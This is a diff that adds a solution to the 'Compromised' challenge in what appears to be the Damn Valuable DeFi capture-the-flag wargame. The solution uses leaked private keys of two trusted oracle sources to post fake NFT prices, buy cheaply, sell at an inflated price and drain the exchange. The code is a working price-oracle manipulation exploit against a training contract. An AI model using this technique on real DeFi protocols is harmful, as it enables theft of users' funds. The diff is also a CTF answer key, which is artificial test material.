@@ -10,6 +10,8 @@ import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleIni
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+import {ExploitContract} from "./ExploitContract.sol";
+
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -75,7 +77,52 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        ExploitContract exploit = new ExploitContract(exchange, nft);
+
+        // We have two of the three trusted accounts
+        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        address trustedAddr1 = vm.addr(pk1);
+        assertEq(trustedAddr1, address(0x188Ea627E3531Db590e6f1D71ED83628d1933088));
+
+        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address trustedAddr2 = vm.addr(pk2);
+        assertEq(vm.addr(pk2), address(0xA417D473c40a4d42BAd35f147c21eEa7973539D8));
+
+        // Do on behalf of the first trusted account
+        vm.prank(trustedAddr1);
+        oracle.postPrice("DVNFT", 0.1 ether);
+        vm.stopPrank();
+
+        // Do on behalf of the second trusted account
+        vm.prank(trustedAddr2);
+        oracle.postPrice("DVNFT", 0.1 ether);
+        vm.stopPrank();
+
+        uint256 id = exploit.buy{value: 0.1 ether}();
+
+        // Do on behalf of the first trusted account
+        vm.prank(trustedAddr1);
+        oracle.postPrice("DVNFT", 999.1 ether);
+        vm.stopPrank();
+
+        // Do on behalf of the second trusted account
+        vm.prank(trustedAddr2);
+        oracle.postPrice("DVNFT", 999.1 ether);
+        vm.stopPrank();
+
+        exploit.sell(id);
+        exploit.drain(player);
+        payable(recovery).transfer(999 ether);
+
+        // Do on behalf of the first trusted account
+        vm.prank(trustedAddr1);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
+
+        // Do on behalf of the second trusted account
+        vm.prank(trustedAddr2);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
     }
 
     /**
